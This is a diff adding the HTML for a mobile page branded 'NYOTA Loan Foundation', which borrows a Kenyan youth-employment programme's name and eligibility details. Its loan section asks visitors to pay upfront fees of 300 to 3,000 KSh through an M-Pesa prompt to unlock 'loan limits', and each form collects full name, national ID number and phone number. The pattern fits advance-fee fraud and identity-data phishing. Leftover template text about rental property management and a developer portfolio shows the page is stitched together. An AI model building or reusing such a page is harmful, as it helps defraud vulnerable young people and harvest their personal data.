@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NYOTA - Roberms Rental</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div id="sideMenu" class="side-menu">
+        <div class="menu-header">
+            <button id="closeMenu" class="back-btn">&#8592;</button>
+        </div>
+        <ul class="menu-links">
+            <li><a href="#" onclick="showPage('homePage')">Home</a></li>
+            <li><a href="#">Services</a></li>
+            <li><a href="#">Get to Know Us</a></li>
+            <li><a href="#">FAQs</a></li>
+        </ul>
+    </div>
+
+    <section id="homePage" class="page">
+        <nav class="navbar main-nav">
+         <div class="logo-area">
+    <div class="logo-image-container">
+        <img src="/images/logo.png" alt="NYOTA" class="logo-img">
+    </div>
+</div>
+     </div>
+            <div id="openMenu" class="hamburger">
+                <span></span><span></span><span></span>
+            </div>
+        </nav>
+
+        <div class="hero">
+            <div class="hero-bg-image">
+                <img src="/images/image.png" alt="Hero Background" class="bg-img">
+            </div>
+            <div class="hero-overlay"></div> <div class="hero-content">
+                <h1>Nyota Loan<br> Foundation</h1>
+                <p>Streamline property management, billing, and tenant communication all in one platform.</p>
+                <button class="btn-apply" onclick="showPage('loanPage')">Apply loan</button>
+            </div>
+        </div>
+        <div class="details-container">
+        <h1 class="page-title">On the Job Experience</h1></div>
+      <div class="container2">
+            <h2>About Me</h2>
+            <p>Hello! I'm a passionate web developer with a love for creating modern websites. I specialize in HTML, CSS, and JavaScript. Welcome to my online portfolio!</p>
+        </div>
+       <div class="employability-section">
+    <div class="employ-card">
+        <div class="card-image-container">
+            <img src="/images/image2.jpg" alt="Youth Training" class="card-img">
+            <div class="floating-circle">
+                <div class="hd-training-icon" alt="Icon">
+            </div>
+        </div></div>
+        
+        <div class="card-text">
+            <h2>Improving Youth Employability</h2>
+            <p>Connecting youth with hands-on apprenticeships that build real skills for lasting employment.</p>
+            <a href="#" class="read-more" onclick="showPage('employabilityPage')">Read More &rarr;</a>
+        </div>
+    </div>
+</div>
+<div class="opportunities-section">
+<div class="impact-card">
+    <div class="card-image-container">
+        <img src="/images/image3.jpg" alt="Business Development" class="card-img">
+        <div class="floating-circle">
+            <div class="hd-briefcase-icon" alt="icon">
+            </div>
+        </div> </div>
+ 
+    <div class="card-text">
+        <h2>Expanding Employment Opportunities</h2>
+        <p>Helping youth create sustainable enterprises and open doors to new jobs.</p>
+        <a href="#" class="read-more" onclick="showPage('statusPage')">Read More &rarr;</a>
+    </div>
+</div>
+
+    </section>
+
+    <section id="loanPage" class="page hidden">
+        <nav class="navbar loan-nav">
+            <button class="back-btn-dark" onclick="showPage('homePage')">&#8592;</button>
+            <div class="logo-area">
+    <div class="logo-image-container">
+        <img src="/images/logo.png" alt="NYOTA" class="logo-img">
+    </div>
+</div>
+            </div>
+            <div></div> </nav>
+
+        <div class="loan-container">
+            <h3>Select Loan Option</h3>
+
+            <div class="accordion">
+                <div class="accordion-header" onclick="toggleAccordion('form1', this)">
+                    <span>Pay 300/-ksh for loan limit 7,000/-ksh</span>
+                    <span class="arrow">&#9662;</span>
+                </div>
+                <div id="form1" class="accordion-content">
+                    <div class="form-group">
+                        <input type="text" placeholder="First Name" required>
+                        <input type="text" placeholder="Second Name" required>
+                        <input type="number" placeholder="ID Number" required>
+                        <input type="tel" placeholder="M-Pesa Number (07...)" required>
+                        <button class="btn-submit" onclick="triggerMpesaPrompt(300)">Submit & Pay 300/-</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="accordion">
+                <div class="accordion-header" onclick="toggleAccordion('form2', this)">
+                    <span>Pay 500/-ksh for loan limit 12,000/-ksh</span>
+                    <span class="arrow">&#9662;</span>
+                </div>
+                <div id="form2" class="accordion-content">
+                    <div class="form-group">
+                        <input type="text" placeholder="First Name" required>
+                        <input type="text" placeholder="Second Name" required>
+                        <input type="number" placeholder="ID Number" required>
+                        <input type="tel" placeholder="M-Pesa Number (07...)" required>
+                        <button class="btn-submit" onclick="triggerMpesaPrompt(500)">Submit & Pay 500/-</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="accordion">
+                <div class="accordion-header" onclick="toggleAccordion('form3', this)">
+                    <span>Pay 1,000k/-sh for loan limit 22,000/-ksh</span>
+                    <span class="arrow">&#9662;</span>
+                </div>
+                <div id="form3" class="accordion-content">
+                    <div class="form-group">
+                        <input type="text" placeholder="First Name" required>
+                        <input type="text" placeholder="Second Name" required>
+                        <input type="number" placeholder="ID Number" required>
+                        <input type="tel" placeholder="M-Pesa Number (07...)" required>
+                        <button class="btn-submit" onclick="triggerMpesaPrompt(1000)">Submit & Pay 1000/-</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="accordion">
+                <div class="accordion-header" onclick="toggleAccordion('form4', this)">
+                    <span>Pay 3,000ksh for loan limit 50,000/-ksh</span>
+                    <span class="arrow">&#9662;</span>
+                </div>
+                <div id="form4" class="accordion-content">
+                    <div class="form-group">
+                        <input type="text" placeholder="First Name" required>
+                        <input type="text" placeholder="Second Name" required>
+                        <input type="number" placeholder="ID Number" required>
+                        <input type="tel" placeholder="M-Pesa Number (07...)" required>
+                        <button class="btn-submit" onclick="triggerMpesaPrompt(3000)">Submit & Pay 3,000/-</button>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <div id="statusOverlay" class="status-overlay hidden">
+        <div class="status-content">
+            <div id="statusLoader" class="loader"></div>
+            <p id="statusText">Processing Request...</p>
+            <button id="doneBtn" class="btn-done hidden" onclick="showPage('homePage')">Done</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    
+    
+<section id="employabilityPage" class="page hidden">
+    <nav class="navbar">
+        <button class="back-btn-dark" onclick="showPage('homePage')">&#8592;</button>
+        <div class="logo-area">
+            <div class="logo-image-container">
+            <img src="/images/logo.png" alt="Logo" class="logo-img small-logo">
+        </div>
+        <div></div>
+    </nav>
+
+    <div class="details-container">
+        <h1 class="page-title">On the Job Experience</h1></div>
+        
+        <div class="info-box">
+            <h3>Eligibility Criteria:</h3>
+            <ul>
+                <li><strong>Age:</strong> 18-29 years (Up to 35 for PWDs)</li>
+                <li><strong>Education:</strong> Form 4 level or below</li>
+                <li><strong>Status:</strong> Unemployed or underemployed</li>
+                <li><strong>Location:</strong> All 47 counties (including refugees in Turkana & Garissa)</li>
+            </ul>
+        </div>
+
+        <div class="info-box">
+            <h3>Key Program Points:</h3>
+            <div class="point">
+                <strong>Duration:</strong> Socio-Emotional Skills Development (SESD) takes 20 days followed by On-the-Job Experience (apprenticeship) that lasts 5 months. The intervention combines on-the-job training with mentorship from industry experts.
+            </div>
+            <div class="point">
+                <strong>Trade Selection:</strong> Participants can choose from various trades within digital, creative, green, blue, and grey economies.
+            </div>
+            <div class="point">
+                <strong>Certification:</strong> Upon successful completion, participants receive formal recognition of their skills through Trade Testing assessment by NITA.
+            </div>
+            <div class="point">
+                <strong>Support System:</strong> The program includes social-emotional skills development, covering areas such as communication, leadership, and financial literacy.
+            </div>
+        </div>
+    </div>
+   </section>
+   
+    <section id="statusPage" class="page hidden">
+    <nav class="navbar">
+        <button class="back-btn-dark" onclick="showPage('homePage')">&#8592;</button>
+        <div class="logo-area"><img src="/imageslogo.png" class="logo-img-main"></div>
+        <div></div>
+    </nav>
+
+    <div class="content-padding">
+        <h2 class="detail-header">Implementation Status</h2>
+        
+        <div class="info-card highlight-box">
+            <p>NYOTA has successfully implemented Business Development Services (BDS) training across <strong>46 counties</strong>, equipping thousands with foundational business skills and financial literacy.</p>
+        </div>
+
+        <div class="milestone-highlight">
+            <h3>KSh 267 Million Disbursed</h3>
+            <p>In the Western Kenya cluster, a major milestone was reached with the disbursement of capital to <strong>12,155 youth</strong> from Kakamega, Bungoma, Busia, and Vihiga counties.</p>
+        </div>
+
+        <h3 class="sub-section-title">Key Interventions</h3>
+
+        <div class="intervention-item">
+            <h4>Business Development Services</h4>
+            <p>Comprehensive training designed to equip youth with tools to start, manage, and grow successful enterprises.</p>
+        </div>
+
+        <div class="intervention-item">
+            <h4>Business Capital</h4>
+            <p>Financial support including grants and seed capital tailored to the enterprise’s nature and growth potential.</p>
+        </div>
+
+        <div class="intervention-item">
+            <h4>Mentorship & Coaching</h4>
+            <p>Structured mentorship from experienced entrepreneurs to help refine business models and navigate challenges.</p>
+        </div>
+    </div>
+</section>
+
+
+</body>
+</html>
